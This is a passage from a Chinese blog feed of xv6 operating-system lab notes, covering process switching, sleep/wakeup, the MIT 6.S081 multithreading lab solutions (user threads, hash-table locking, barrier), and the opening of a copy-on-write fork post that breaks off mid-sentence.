title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=<span class="string">&quot;bcache&quot;</span> grade</span><br></pre></td></tr></table></figure><br><img src="buffer-cache实验结果.png" alt="Buffer cache实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xv6-七</title>
      <link href="/2022/07/04/xv6-%E4%B8%83/"/>
      <url>/2022/07/04/xv6-%E4%B8%83/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇博客研究<strong>xv6</strong>的<strong>进程调度</strong>机制的实现</p><h1 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h1><p>现代操作系统基本都支持并行多进程(多CPU多进程)，而要实现该功能，需要解决如下问题</p><ol><li>如何切换进程？<br>虽然实现思路不是很难，但是实现细节比较复杂。</li><li>如何对用户进程透明？<br>即用户进程应该对于进程切换无感——进程切换前和进程切换后，进程的上下文不应有任何改变</li><li>如何找到当前CPU执行的进程的描述符？<br>进程可能被切换到任何CPU上，则CPU应当可以高效的找到当前执行的进程的描述符信息，从而在<strong>S-mode</strong>时更改当前进程的状态信息</li></ol><h2 id="进程切换"><a href="#进程切换" class="headerlink" title="进程切换"></a>进程切换</h2><p><strong>xv6</strong>的进程切换的基本流程如下图所示<br><img src="进程切换.png" alt="xv6进程切换示意图"></p><p>可以看到，<strong>xv6</strong>实现进程切换的方式非常标准——首先从<strong>U-mode</strong>陷入到<strong>S-mode</strong>(系统调用或中断)，再从对应的<strong>S-mode</strong>切换到CPU切换进程(每个CPU在操作系统初始化时的执行流)。</p><p>接着就是上述步骤的反向操作，即切换到调度出的待切换进程的<strong>S-mode</strong>，然后从<strong>S-mode</strong>返回到<strong>U-mode</strong>，最终完成进程切换</p><p>进程调度时，进程首先<strong>陷入</strong>到<strong>S-mode</strong>，根据前面<a href="/2022/05/21/xv6-%E4%BA%8C/" title="xv6-二">xv6-二</a>可知，<strong>U-mode</strong>的上下文会保存在<strong>S-mode</strong>的内核栈中；当进程切换结束时，会从<strong>S-mode</strong>返回到<strong>U-mode</strong>，内核从进程的内核栈中恢复<strong>U-mode</strong>的上下文，从而还原到切换前的<strong>U-mode</strong>状态。这样的机制保证了对用户进程的透明</p><p>而进程切换最关键的代码则是<strong>swtch</strong>(kernel/swtch.S:8)，其将当前进程的<strong>S-mode</strong>的上下文保存，并载入调度选中的进程的<strong>S-mode</strong>的上下文并执行。这里需要注意的几个点是</p><ul><li><strong>S-mode</strong>共享一个地址空间，所以无需更换页表，即可访问相关的虚拟地址资源</li><li>每一个进程的地址描述符(<strong>struct proc</strong>(kernel/proc.h:86)或<strong>struct cpu</strong>(kernel/proc.h:22))中包含<strong>struct context</strong>(kernel/proc.h:2)，用来保存被切换时进程<strong>S-mode</strong>的上下文信息</li><li>进程切换时，并不会保存或载入<strong>pc</strong>寄存器。其通过保存和载入<strong>ra</strong>寄存器，在进程从<strong>swtch</strong>返回时实现CPU执行流的切换</li></ul><h2 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h2><p>正如上一节分析的，每次进程调度时，都涉及到<strong>CPU切换进程</strong>。实际上，<strong>CPU切换进程</strong>就是每个CPU在操作系统初始化时的执行流抽象的进程，其在<strong>_entry</strong>(kernel/entry.S:5)中构建进程的<strong>S-mode</strong>栈；其在<strong>main</strong>(kernel/main.c:44)中循环执行<strong>scheduler()</strong>，用来调度并切换进程。由于其特殊性质——每个CPU一个<strong>CPU切换进程</strong>，并且基本上仅仅用来调度进程，因此其不需要完整的进程描述符来表示，使用<strong>struct cpu</strong>(kernel/proc.h:22)的部分字段即可。</p><p>而一般的进程调度调用栈如下图所示<br><img src="进程调度调用栈.png" alt="进程调度调用栈"></p><p>可以看到，从一个进程切换到另一个进程过程中，一共调用了两次<strong>swtch</strong>(kernel/swtch.S:8)。第一次调用为<code>swtch(&amp;p-&gt;context, &amp;mycpu()-&gt;context)</code>，即切换到<strong>CPU切换进程</strong>；第二次调用为<code>swtch(&amp;c-&gt;context, &amp;p-&gt;context)</code>，即从<strong>CPU切换进程</strong>切换到调度出的进程上下文。整体的逻辑还是非常清晰的。</p><p>其调度策略也很简单，循环遍历进程描述符数组，直到找到一个可被调度的进程即可</p><h2 id="struct-cpu"><a href="#struct-cpu" class="headerlink" title="struct cpu"></a>struct cpu</h2><p>为了记录CPU独占的数据(如当前执行的进程描述符、CPU切换进程)，<strong>xv6</strong>使用<strong>struct cpu</strong>(kernel/proc.h:22)来管理。</p><p>其中，在<strong>S-mode</strong>地址空间中，包含元素为<strong>struct cpu</strong>的数组<strong>cpus</strong>(kernel/proc.c:9)，其包含了当前所有CPU的描述符。每个CPU可以以各自的<strong>hartid</strong>作为下标，访问对应的描述符。</p><p>这里需要注意的是，每个CPU的<strong>hartid</strong>只能在<strong>M-mode</strong>中访问。在<strong>S-mode</strong>中，xv6保证CPU对应的<strong>hartid</strong>会保存在其<strong>tp</strong>(thread pointer)中，可以通过<strong>mycpu</strong>(kernel/proc.c:59)来获取当前CPU对应的描述符。但是其应该在关闭中断时调用——否则在执行一般时可能发生进程调度，从而返回错误的结果</p><h1 id="wake-sleep"><a href="#wake-sleep" class="headerlink" title="wake()/sleep()"></a>wake()/sleep()</h1><p>类似于<strong>acquiresleep()/releasesleep()</strong>，操作系统提供了这一组函数，用于进程等待事件发生以及事件发生时唤醒等待进程。其实现如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//kernel/proc.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Atomically release lock and sleep on chan.</span></span><br><span class="line"><span class="comment">// Reacquires lock when awakened.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">sleep</span><span class="params">(<span class="type">void</span> *chan, <span class="keyword">struct</span> spinlock *lk)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Must acquire p-&gt;lock in order to</span></span><br><span class="line">  <span class="comment">// change p-&gt;state and then call sched.</span></span><br><span class="line">  <span class="comment">// Once we hold p-&gt;lock, we can be</span></span><br><span class="line">  <span class="comment">// guaranteed that we won&#x27;t miss any wakeup</span></span><br><span class="line">  <span class="comment">// (wakeup locks p-&gt;lock),</span></span><br><span class="line">  <span class="comment">// so it&#x27;s okay to release lk.</span></span><br><span class="line">  <span class="keyword">if</span>(lk != &amp;p-&gt;lock)&#123;  <span class="comment">//DOC: sleeplock0</span></span><br><span class="line">    acquire(&amp;p-&gt;lock);  <span class="comment">//DOC: sleeplock1</span></span><br><span class="line">    release(lk);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Go to sleep.</span></span><br><span class="line">  p-&gt;chan = chan;</span><br><span class="line">  p-&gt;state = SLEEPING;</span><br><span class="line"></span><br><span class="line">  sched();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Tidy up.</span></span><br><span class="line">  p-&gt;chan = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reacquire original lock.</span></span><br><span class="line">  <span class="keyword">if</span>(lk != &amp;p-&gt;lock)&#123;</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">    acquire(lk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wake up all processes sleeping on chan.</span></span><br><span class="line"><span class="comment">// Must be called without any p-&gt;lock.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">wakeup</span><span class="params">(<span class="type">void</span> *chan)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    acquire(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state == SLEEPING &amp;&amp; p-&gt;chan == chan) &#123;</span><br><span class="line">      p-&gt;state = RUNNABLE;</span><br><span class="line">    &#125;</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>整体思路非常简单，<strong>sleep()</strong>即将当前进程的状态设置为<strong>SLEEPING</strong>，并释放传入的锁即可;<strong>wake()</strong>即将所有包含等待事件的进程状态设置为<strong>RUNNABLE</strong>即可</p><p>这里需要特别说明一下，在调用<strong>sleep()</strong>和<strong>wake()</strong>前，需要获取相应的<strong>自旋锁</strong>，避免部分等待进程会遗漏<strong>wake()</strong>。即当某一进程正在唤醒阻塞进程时，可能新的进程会准备阻塞，<br><img src="sleep_wake.png" alt="sleep()/wake()bug"></p><h1 id="Lab-Multithreading"><a href="#Lab-Multithreading" class="headerlink" title="Lab Multithreading"></a>Lab Multithreading</h1><p>本次<a href="https://pdos.csail.mit.edu/6.828/2020/labs/thread.html">lab</a>用来加深对于<strong>xv6</strong>的<strong>多进程</strong>机制理解</p><h2 id="Uthread-switching-between-threads"><a href="#Uthread-switching-between-threads" class="headerlink" title="Uthread: switching between threads"></a>Uthread: switching between threads</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Your job is to come up with a plan to create threads and save/restore registers to switch between threads, and implement that plan. When you’re done, <strong>make grade</strong> should say that your solution passes the <strong>uthread</strong> test.</p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>实际上，用户态进程切换和操作系统的进程切换非常相似，但是更简单——因为这里的用户态进程不并行(这里的用户态下的多进程不会同时在两个CPU下执行)。</p><p>其进程切换就是将当前CPU的上下文保存到当前用户态进程的<strong>context</strong>中；载入被选中的用户态进程的<strong>context</strong>即可。</p><p>为了方便管理，直接将用户态进程的进程栈的底部当做该进程的<strong>context</strong>存储位置即可</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>首先，在创建用户态进程时，提前设置好用户态进程的<strong>context</strong>，从而确保该进程在第一次被载入时，可以正常的执行回调函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user/uthread.c</span></span><br><span class="line"><span class="comment">// Saved registers for user context switches.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  uint64 ra;</span><br><span class="line">  uint64 sp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// callee-saved</span></span><br><span class="line">  uint64 s0;</span><br><span class="line">  uint64 s1;</span><br><span class="line">  uint64 s2;</span><br><span class="line">  uint64 s3;</span><br><span class="line">  uint64 s4;</span><br><span class="line">  uint64 s5;</span><br><span class="line">  uint64 s6;</span><br><span class="line">  uint64 s7;</span><br><span class="line">  uint64 s8;</span><br><span class="line">  uint64 s9;</span><br><span class="line">  uint64 s10;</span><br><span class="line">  uint64 s11;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> </span><br><span class="line"><span class="title function_">thread_create</span><span class="params">(<span class="type">void</span> (*func)())</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (t = all_thread; t &lt; all_thread + MAX_THREAD; t++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;state == FREE) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  t-&gt;state = RUNNABLE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * set the thread context&#x27;s stack and ret address</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> *<span class="title">c</span> =</span> (<span class="keyword">struct</span> context*)t-&gt;<span class="built_in">stack</span>;</span><br><span class="line">  c-&gt;ra = (uint64)func;</span><br><span class="line">  c-&gt;sp = (uint64)(t-&gt;<span class="built_in">stack</span> + STACK_SIZE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>接下来，则是当进行用户态的多进程调度时，完成进程的<strong>context</strong>的保存和恢复即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user/uthread.c</span></span><br><span class="line"><span class="type">void</span> </span><br><span class="line"><span class="title function_">thread_schedule</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (current_thread != next_thread) &#123;         <span class="comment">/* switch threads?  */</span></span><br><span class="line">    next_thread-&gt;state = RUNNING;</span><br><span class="line">    t = current_thread;</span><br><span class="line">    current_thread = next_thread;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// switch thread context</span></span><br><span class="line">    thread_switch((<span class="keyword">struct</span> context*)t-&gt;<span class="built_in">stack</span>,</span><br><span class="line">                  (<span class="keyword">struct</span> context*)current_thread-&gt;<span class="built_in">stack</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    next_thread = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// user/uthread_switch.S</span></span><br><span class="line">.text</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     * save the old thread&#x27;s registers,</span></span><br><span class="line"><span class="comment"> * thread_switch(struct context *old, struct context *new);</span></span><br><span class="line"><span class="comment">     * restore the new thread&#x27;s registers.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">.globl thread_switch</span><br><span class="line">thread_switch:</span><br><span class="line">    sd ra, <span class="number">0</span>(a0)</span><br><span class="line">    sd sp, <span class="number">8</span>(a0)</span><br><span class="line">    sd s0, <span class="number">16</span>(a0)</span><br><span class="line">    sd s1, <span class="number">24</span>(a0)</span><br><span class="line">    sd s2, <span class="number">32</span>(a0)</span><br><span class="line">    sd s3, <span class="number">40</span>(a0)</span><br><span class="line">    sd s4, <span class="number">48</span>(a0)</span><br><span class="line">    sd s5, <span class="number">56</span>(a0)</span><br><span class="line">    sd s6, <span class="number">64</span>(a0)</span><br><span class="line">    sd s7, <span class="number">72</span>(a0)</span><br><span class="line">    sd s8, <span class="number">80</span>(a0)</span><br><span class="line">    sd s9, <span class="number">88</span>(a0)</span><br><span class="line">    sd s10, <span class="number">96</span>(a0)</span><br><span class="line">    sd s11, <span class="number">104</span>(a0)</span><br><span class="line"></span><br><span class="line">    ld ra, <span class="number">0</span>(a1)</span><br><span class="line">    ld sp, <span class="number">8</span>(a1)</span><br><span class="line">    ld s0, <span class="number">16</span>(a1)</span><br><span class="line">    ld s1, <span class="number">24</span>(a1)</span><br><span class="line">    ld s2, <span class="number">32</span>(a1)</span><br><span class="line">    ld s3, <span class="number">40</span>(a1)</span><br><span class="line">    ld s4, <span class="number">48</span>(a1)</span><br><span class="line">    ld s5, <span class="number">56</span>(a1)</span><br><span class="line">    ld s6, <span class="number">64</span>(a1)</span><br><span class="line">    ld s7, <span class="number">72</span>(a1)</span><br><span class="line">    ld s8, <span class="number">80</span>(a1)</span><br><span class="line">    ld s9, <span class="number">88</span>(a1)</span><br><span class="line">    ld s10, <span class="number">96</span>(a1)</span><br><span class="line">    ld s11, <span class="number">104</span>(a1)</span><br><span class="line">ret    <span class="comment">/* return to ra */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=<span class="string">&quot;uthread&quot;</span> grade</span><br></pre></td></tr></table></figure><br><img src="uthread实验结果.png" alt="uthread实验结果"></p><h2 id="Using-threads"><a href="#Using-threads" class="headerlink" title="Using threads"></a>Using threads</h2><h3 id="要求-1"><a href="#要求-1" class="headerlink" title="要求"></a>要求</h3><blockquote><p>insert lock and unlock statements in <strong>put</strong> and <strong>get</strong> in <strong>notxv6/ph.c</strong> so that the number of keys missing is always 0 with two threads. The relevant pthread calls are:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pthread_mutex_t</span> lock;            <span class="comment">// declare a lock</span></span><br><span class="line">pthread_mutex_init(&amp;lock, <span class="literal">NULL</span>); <span class="comment">// initialize the lock</span></span><br><span class="line">pthread_mutex_lock(&amp;lock);       <span class="comment">// acquire lock</span></span><br><span class="line">pthread_mutex_unlock(&amp;lock);     <span class="comment">// release lock</span></span><br></pre></td></tr></table></figure><p>You’re done when <strong>make grade</strong> says that your code passes the <strong>ph_safe</strong> test, which requires zero missing keys with two threads.</p></blockquote><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>当多个进程同时在哈希表中插入时，则由于条件竞争，会导致部分插入的键-值对丢失——最简单的例子，假如两个进程同时插入一个键相同但值不同的键-值对，当他们同时执行到<strong>insert</strong>函数时，必然会有一个进程覆盖掉另一个进程的插入。</p><p>那么解决办法很简单，就是在可能产生条件竞争的操作上上锁就行。</p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>由于<strong>put</strong>函数可能同时读、写同一个键-值对，则在该函数中上锁即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// notxv6/ph.c</span></span><br><span class="line"><span class="type">pthread_mutex_t</span> locks[NBUCKET];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> </span><br><span class="line"><span class="type">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i = key % NBUCKET;</span><br><span class="line"></span><br><span class="line">  pthread_mutex_lock(&amp;locks[i]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// is the key already present?</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">entry</span> *<span class="title">e</span> =</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (e = table[i]; e != <span class="number">0</span>; e = e-&gt;next) &#123;</span><br><span class="line">    <span class="keyword">if</span> (e-&gt;key == key)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(e)&#123;</span><br><span class="line">    <span class="comment">// update the existing key.</span></span><br><span class="line">    e-&gt;value = value;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// the new is new.</span></span><br><span class="line">    insert(key, value, &amp;table[i], table[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  pthread_mutex_unlock(&amp;locks[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=<span class="string">&quot;uthread&quot;</span> grade</span><br></pre></td></tr></table></figure><br><img src="using-threads.png" alt="Using threads"></p><h2 id="Barrier"><a href="#Barrier" class="headerlink" title="Barrier"></a>Barrier</h2><h3 id="要求-2"><a href="#要求-2" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Your goal is to achieve the desired barrier behavior. In addition to the lock primitives that you have seen in the ph assignment, you will need the following new pthread primitives; look <a href="https://pubs.opengroup.org/onlinepubs/007908799/xsh/pthread_cond_wait.html">here</a> and <a href="https://pubs.opengroup.org/onlinepubs/007908799/xsh/pthread_cond_broadcast.html">here</a> for details.</p><p>pthread_cond_wait(&amp;cond, &amp;mutex);  // go to sleep on cond, releasing lock mutex, acquiring upon wake up<br>pthread_cond_broadcast(&amp;cond);     // wake up every thread sleeping on cond</p><p>Make sure your solution passes make grade’s barrier test. </p></blockquote><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>即每次调用<strong>barrier</strong>函数时，阻塞当前进程，直到被阻塞进程的个数等于用户态多进程个数为止，由最后一个进入的进程唤醒所有进程即可。</p><p>这里特别需要注意的是<strong>pthread_cond_wait</strong>函数对于<strong>mutex</strong>参数的操作——在进入前，<strong>mutex</strong>需要已经被获取，然后在标记用户态进程被阻塞后释放，并直到被唤醒后再次获取锁</p><p>一轮<strong>barrier</strong>的进程同步情况如图所示<br><img src="barrier_sync.png" alt="一轮barrier的同步"></p><h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><p>即按照前面的分析，首先获取<strong>mutex</strong>互斥锁，然后根据当前阻塞在<strong>barrier</strong>的进程个数，睡眠或唤醒，并在最后释放掉<strong>mutex</strong>互斥锁即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// notxv6/barrier.c</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> </span><br><span class="line"><span class="title function_">barrier</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  pthread_mutex_lock(&amp;bstate.barrier_mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">   * if ++bstate.nthread != nthread, there still some</span></span><br><span class="line"><span class="comment">   * thread has not reached the barrier, so this</span></span><br><span class="line"><span class="comment">   * thread should wait</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * if old_nthread == nthread, thread is the last</span></span><br><span class="line"><span class="comment">   * to reach the barrier, it should wake other</span></span><br><span class="line"><span class="comment">   * thread</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span>(++bstate.nthread == nthread) &#123;</span><br><span class="line"></span><br><span class="line">    ++bstate.round;</span><br><span class="line">    bstate.nthread = <span class="number">0</span>;</span><br><span class="line">    pthread_cond_broadcast(&amp;bstate.barrier_cond);</span><br><span class="line"></span><br><span class="line">  &#125;<span class="keyword">else</span></span><br><span class="line">    pthread_cond_wait(&amp;bstate.barrier_cond,</span><br><span class="line">                      &amp;bstate.barrier_mutex);</span><br><span class="line"></span><br><span class="line">  pthread_mutex_unlock(&amp;bstate.barrier_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=<span class="string">&quot;barrier&quot;</span> grade</span><br></pre></td></tr></table></figure><br><img src="barrier.png" alt="Barrier"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xv6-六</title>
      <link href="/2022/06/14/xv6-%E5%85%AD/"/>
      <url>/2022/06/14/xv6-%E5%85%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇博客研究<strong>xv6</strong>的<strong>Copy-on-Write</strong>机制的实现</p><h1 id="Lab-Copy-on-Write-Fork-for-xv6"><a href="#Lab-Copy-on-Write-Fork-for-xv6" class="headerlink" title="Lab Copy-on-Write Fork for xv6"></a>Lab Copy-on-Write Fork for xv6</h1><p>本次<a href="https://pdos.csail.mit.edu/6.828/2020/labs/cow.html">lab</a>用来实现<strong>xv6</strong>的<strong>Copy-on-Write</strong>机制</p><h2 id="Copy-on-Write"><a href="#Copy-on-Write" class="headerlink" title="Copy-on-Write"></a>Copy-on-Write</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><blockquote><p> Your task is to implement <strong>copy-on-write</strong> <strong>fork</strong> in the xv6 kernel. You are done if your modified kernel executes both the cowtest and usertests programs successfully. </p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><strong>Copy-on-Write</strong>和<strong>lazy allocation</strong>非常类似，都是为了节省直接分配导致的性能损失，从而推迟实际的<strong>physical page</strong>的分配和映射，仅仅完成<strong>virtual page</strong>的分配。</p><p>其中，<strong>Copy-on-Write</strong>是在进程<strong>fork</strong>时，仅仅复制父进程的<strong>pd</strong>(页表)，而共享实际的<strong>physical page</strong>，从而节省了<strong>physical 